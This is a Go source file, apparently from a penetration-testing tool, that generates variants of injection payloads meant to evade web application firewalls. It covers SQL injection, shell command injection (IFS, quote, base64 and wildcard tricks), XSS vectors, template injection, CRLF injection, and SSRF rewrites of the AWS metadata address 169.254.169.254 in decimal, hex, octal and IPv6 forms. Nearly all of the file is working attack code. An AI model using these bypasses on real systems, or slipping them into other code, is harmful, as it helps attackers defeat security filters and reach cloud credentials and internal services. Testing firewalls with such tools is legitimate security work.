package evasion

import (
	"fmt"
	"math/rand/v2"
	"net/url"
	"strings"
)

// SQLBypass generates WAF-evading variants of a SQL injection payload.
func SQLBypass(payload string) []string {
	var variants []string

	// Original.
	variants = append(variants, payload)

	// Case variation: SeLeCt, UnIoN.
	variants = append(variants, randomCase(payload))

	// Inline comments: UN/**/ION SE/**/LECT.
	variants = append(variants, inlineComments(payload))

	// URL encoding of SQL keywords.
	variants = append(variants, urlEncodeKeywords(payload))

	// Double URL encoding.
	variants = append(variants, doubleURLEncode(payload))

	// Whitespace substitution: use tabs, /**/, %0a instead of spaces.
	variants = append(variants, whitespaceSubstitutes(payload)...)

	// Concat-based bypass: CONCAT(char(83),char(69),char(76),char(69),char(67),char(84)).
	if strings.Contains(strings.ToUpper(payload), "SELECT") {
		variants = append(variants, charConcat(payload))
	}

	return variants
}

// CmdBypass generates WAF-evading variants of a command injection payload.
func CmdBypass(payload string) []string {
	var variants []string

	// Original.
	variants = append(variants, payload)

	// Variable expansion: s${IFS}leep → sleep.
	variants = append(variants, ifsSubstitute(payload))

	// Single-quote break: sl'ee'p → sleep.
	variants = append(variants, quoteBreak(payload))

	// Backslash break: s\leep → sleep.
	variants = append(variants, backslashBreak(payload))

	// $() substitution: $(echo c2xlZXA= | base64 -d) → sleep.
	variants = append(variants, base64Wrap(payload))

	// Hex encoding: $'\x73\x6c\x65\x65\x70' → sleep.
	variants = append(variants, hexEncode(payload))

	// Wildcard bypass: /b?n/s?eep → /bin/sleep.
	variants = append(variants, wildcardBypass(payload))

	// Tab instead of space.
	variants = append(variants, strings.ReplaceAll(payload, " ", "\t"))

	return variants
}

// XSSBypass generates WAF-evading variants of an XSS payload.
func XSSBypass(payload string) []string {
	var variants []string

	variants = append(variants, payload)

	// Case variation.
	variants = append(variants, randomCase(payload))

	// Event handler alternatives.
	if strings.Contains(payload, "onerror") {
		variants = append(variants, strings.ReplaceAll(payload, "onerror", "onload"))
		variants = append(variants, strings.ReplaceAll(payload, "onerror", "onfocus"))
		variants = append(variants, strings.ReplaceAll(payload, "onerror", "onmouseover"))
	}

	// SVG-based.
	variants = append(variants, `<svg onload=alert(1)>`)
	variants = append(variants, `<svg/onload=alert(1)>`)

	// JavaScript protocol.
	variants = append(variants, `javascript:alert(1)`)
	variants = append(variants, `java%0ascript:alert(1)`)
	variants = append(variants, `java%09script:alert(1)`)

	// HTML entity encoding.
	variants = append(variants, htmlEntityEncode(payload))

	// Template literal.
	variants = append(variants, `<img src=x onerror=alert`+"`1`"+`>`)

	return variants
}

// SSTIBypass generates WAF-evading variants of a template injection expression.
// These exploit differences in how WAFs and template engines parse delimiters.
func SSTIBypass(expr string) []string {
	var variants []string

	// URL-encoded delimiters: {{7*7}} → %7B%7B7*7%7D%7D
	variants = append(variants, urlEncodeBraces(expr))

	// Jinja2 print directive: {{7*7}} → {%print(7*7)%}
	if strings.Contains(expr, "{{") && strings.Contains(expr, "}}") {
		inner := strings.TrimPrefix(strings.TrimSuffix(expr, "}}"), "{{")
		variants = append(variants, "{%print("+inner+")%}")
	}

	// Comment injection for Twig: {{7{# #}*7}}
	if strings.Contains(expr, "{{") {
		inner := strings.TrimPrefix(strings.TrimSuffix(expr, "}}"), "{{")
		if len(inner) > 2 {
			mid := len(inner) / 2
			variants = append(variants, "{{"+inner[:mid]+"{# #}"+inner[mid:]+"}}")
		}
	}

	// String concatenation in Jinja2: {{'7'*7}} or {{lipsum.__globals__}}
	if expr == "{{7*7}}" {
		variants = append(variants, "{{'7'*7}}")
		variants = append(variants, "{{7*'7'}}")
	}

	return variants
}

// SSRFBypass generates WAF-evading variants of SSRF target URLs.
// Bypasses common WAF rules that block 169.254.169.254 and other metadata IPs.
func SSRFBypass(targetURL string) []string {
	var variants []string

	// IP notation variants for AWS metadata
	if strings.Contains(targetURL, "169.254.169.254") {
		// Decimal notation
		variants = append(variants, strings.ReplaceAll(targetURL, "169.254.169.254", "2852039166"))
		// Hex notation
		variants = append(variants, strings.ReplaceAll(targetURL, "169.254.169.254", "0xa9fea9fe"))
		// Octal notation
		variants = append(variants, strings.ReplaceAll(targetURL, "169.254.169.254", "0251.0376.0251.0376"))
		// Mixed notation
		variants = append(variants, strings.ReplaceAll(targetURL, "169.254.169.254", "169.254.169.254."))
		// IPv6 mapped
		variants = append(variants, strings.ReplaceAll(targetURL, "169.254.169.254", "[::ffff:a9fe:a9fe]"))
		// Userinfo bypass: WAFs that check the hostname may not parse the @.
		// http://foo@169.254.169.254 → HTTP client treats 169.254.169.254 as host.
		variants = append(variants, strings.ReplaceAll(targetURL, "http://169.254.169.254", "http://foo@169.254.169.254"))
	}

	// Protocol-level bypasses
	if strings.HasPrefix(targetURL, "http://") {
		variants = append(variants, strings.Replace(targetURL, "http://", "http:///", 1))
	}

	return variants
}

// CRLFBypass generates WAF-evading variants of CRLF injection suffixes.
func CRLFBypass(suffix string) []string {
	var variants []string

	// Double URL encoding
	variants = append(variants, strings.ReplaceAll(strings.ReplaceAll(suffix, "%0d", "%250d"), "%0a", "%250a"))
	// Mixed case hex
	variants = append(variants, strings.ReplaceAll(strings.ReplaceAll(suffix, "%0d", "%0D"), "%0a", "%0A"))
	// Unicode variants
	variants = append(variants, strings.ReplaceAll(strings.ReplaceAll(suffix, "%0d%0a", "%E5%98%8A%E5%98%8D"), "%0a", "%E5%98%8A"))
	// Tab before header name
	variants = append(variants, strings.ReplaceAll(suffix, "%0d%0a", "%0d%0a%09"))

	return variants
}

func urlEncodeBraces(s string) string {
	s = strings.ReplaceAll(s, "{", "%7B")
	s = strings.ReplaceAll(s, "}", "%7D")
	return s
}

// --- Helper functions ---

func randomCase(s string) string {
	runes := []rune(s)
	flipped := false
	for i, c := range runes {
		upper := []rune(strings.ToUpper(string(c)))
		lower := []rune(strings.ToLower(string(c)))
		if upper[0] == lower[0] {
			continue // not a letter, skip
		}
		if rand.IntN(2) == 0 {
			if c == upper[0] {
				runes[i] = lower[0]
			} else {
				runes[i] = upper[0]
			}
			flipped = true
		}
	}
	// Guarantee at least one case change — flip the first letter if needed.
	if !flipped {
		for i, c := range runes {
			upper := []rune(strings.ToUpper(string(c)))
			lower := []rune(strings.ToLower(string(c)))
			if upper[0] != lower[0] {
				if c == upper[0] {
					runes[i] = lower[0]
				} else {
					runes[i] = upper[0]
				}
				break
			}
		}
	}
	return string(runes)
}

func inlineComments(s string) string {
	keywords := []string{"SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT", "UPDATE", "DELETE", "DROP"}
	result := s
	for _, kw := range keywords {
		if len(kw) <= 2 {
			continue
		}
		mid := len(kw) / 2
		replacement := kw[:mid] + "/**/" + kw[mid:]
		// Case-insensitive replace: find keyword positions without uppercasing
		// the entire string (which would destroy table/column names).
		result = replaceIgnoreCase(result, kw, replacement)
	}
	return result
}

// replaceIgnoreCase replaces all case-insensitive occurrences of old with new_
// without modifying the case of surrounding text.
func replaceIgnoreCase(s, old, new_ string) string {
	upper := strings.ToUpper(s)
	oldUpper := strings.ToUpper(old)
	var b strings.Builder
	pos := 0
	for {
		idx := strings.Index(upper[pos:], oldUpper)
		if idx < 0 {
			b.WriteString(s[pos:])
			break
		}
		b.WriteString(s[pos : pos+idx])
		b.WriteString(new_)
		pos += idx + len(old)
	}
	return b.String()
}

func urlEncodeKeywords(s string) string {
	keywords := []string{"SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "SLEEP", "WAITFOR"}
	result := s
	for _, kw := range keywords {
		if strings.Contains(strings.ToUpper(result), kw) {
			encoded := url.QueryEscape(kw)
			result = strings.ReplaceAll(strings.ToUpper(result), kw, encoded)
		}
	}
	return result
}

func doubleURLEncode(s string) string {
	// First pass: percent-encode every byte (not QueryEscape, which uses + for spaces).
	var first strings.Builder
	for i := 0; i < len(s); i++ {
		first.WriteString(fmt.Sprintf("%%%02X", s[i]))
	}
	// Second pass: encode the % signs from the first pass.
	return strings.ReplaceAll(first.String(), "%", "%25")
}

func whitespaceSubstitutes(s string) []string {
	replacements := []string{"/**/", "%09", "%0a", "%0d"}
	variants := make([]string, len(replacements))
	for i, r := range replacements {
		variants[i] = strings.ReplaceAll(s, " ", r)
	}
	return variants
}

func charConcat(s string) string {
	// Replace SELECT with MySQL CHAR() concat.
	if strings.Contains(strings.ToUpper(s), "SELECT") {
		charSelect := "CHAR(83,69,76,69,67,84)"
		return strings.ReplaceAll(strings.ToUpper(s), "SELECT", charSelect)
	}
	return s
}

func ifsSubstitute(s string) string {
	return strings.ReplaceAll(s, " ", "${IFS}")
}

func quoteBreak(s string) string {
	// Break command names with single quotes: sleep → sl'ee'p.
	var b strings.Builder
	for i, c := range s {
		b.WriteRune(c)
		if i > 0 && i < len(s)-1 && i%2 == 0 && c >= 'a' && c <= 'z' {
			b.WriteString("''")
		}
	}
	return b.String()
}

func backslashBreak(s string) string {
	// Insert backslashes: sleep → s\leep.
	words := strings.Fields(s)
	for i, word := range words {
		if len(word) > 2 && word[0] >= 'a' && word[0] <= 'z' {
			words[i] = string(word[0]) + "\\" + word[1:]
		}
	}
	return strings.Join(words, " ")
}

func base64Wrap(s string) string {
	// Wrap the command in base64: echo <b64> | base64 -d | sh.
	// For simplicity, just wrap the first word.
	words := strings.Fields(s)
	if len(words) == 0 {
		return s
	}
	return fmt.Sprintf("$(echo %s | base64 -d)", simpleBase64(words[0])) +
		" " + strings.Join(words[1:], " ")
}

func hexEncode(s string) string {
	// Bash hex encoding: $'\x73\x6c\x65\x65\x70'.
	words := strings.Fields(s)
	if len(words) == 0 {
		return s
	}
	var hex strings.Builder
	hex.WriteString("$'")
	for _, c := range words[0] {
		hex.WriteString(fmt.Sprintf("\\x%02x", c))
	}
	hex.WriteString("'")
	if len(words) > 1 {
		hex.WriteString(" " + strings.Join(words[1:], " "))
	}
	return hex.String()
}

func wildcardBypass(s string) string {
	// Replace characters with ? wildcards in command paths.
	// /bin/sleep → /b?n/sl?ep
	return strings.NewReplacer(
		"/bin/", "/b?n/",
		"sleep", "sl?ep",
		"curl", "cu?l",
		"wget", "wg?t",
		"cat", "c?t",
	).Replace(s)
}

func htmlEntityEncode(s string) string {
	var b strings.Builder
	for _, c := range s {
		if c == '<' || c == '>' || c == '"' || c == '\'' || c == '/' {
			b.WriteString(fmt.Sprintf("&#x%x;", c))
		} else {
			b.WriteRune(c)
		}
	}
	return b.String()
}

// simpleBase64 is a minimal base64 encoder for short strings (avoids importing encoding/base64).
func simpleBase64(s string) string {
	const table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	var b strings.Builder
	data := []byte(s)
	for i := 0; i < len(data); i += 3 {
		var n uint32
		remaining := len(data) - i
		switch {
		case remaining >= 3:
			n = uint32(data[i])<<16 | uint32(data[i+1])<<8 | uint32(data[i+2])
			b.WriteByte(table[n>>18&0x3F])
			b.WriteByte(table[n>>12&0x3F])
			b.WriteByte(table[n>>6&0x3F])
			b.WriteByte(table[n&0x3F])
		case remaining == 2:
			n = uint32(data[i])<<16 | uint32(data[i+1])<<8
			b.WriteByte(table[n>>18&0x3F])
			b.WriteByte(table[n>>12&0x3F])
			b.WriteByte(table[n>>6&0x3F])
			b.WriteByte('=')
		case remaining == 1:
			n = uint32(data[i]) << 16
			b.WriteByte(table[n>>18&0x3F])
			b.WriteByte(table[n>>12&0x3F])
			b.WriteString("==")
		}
	}
	return b.String()
}
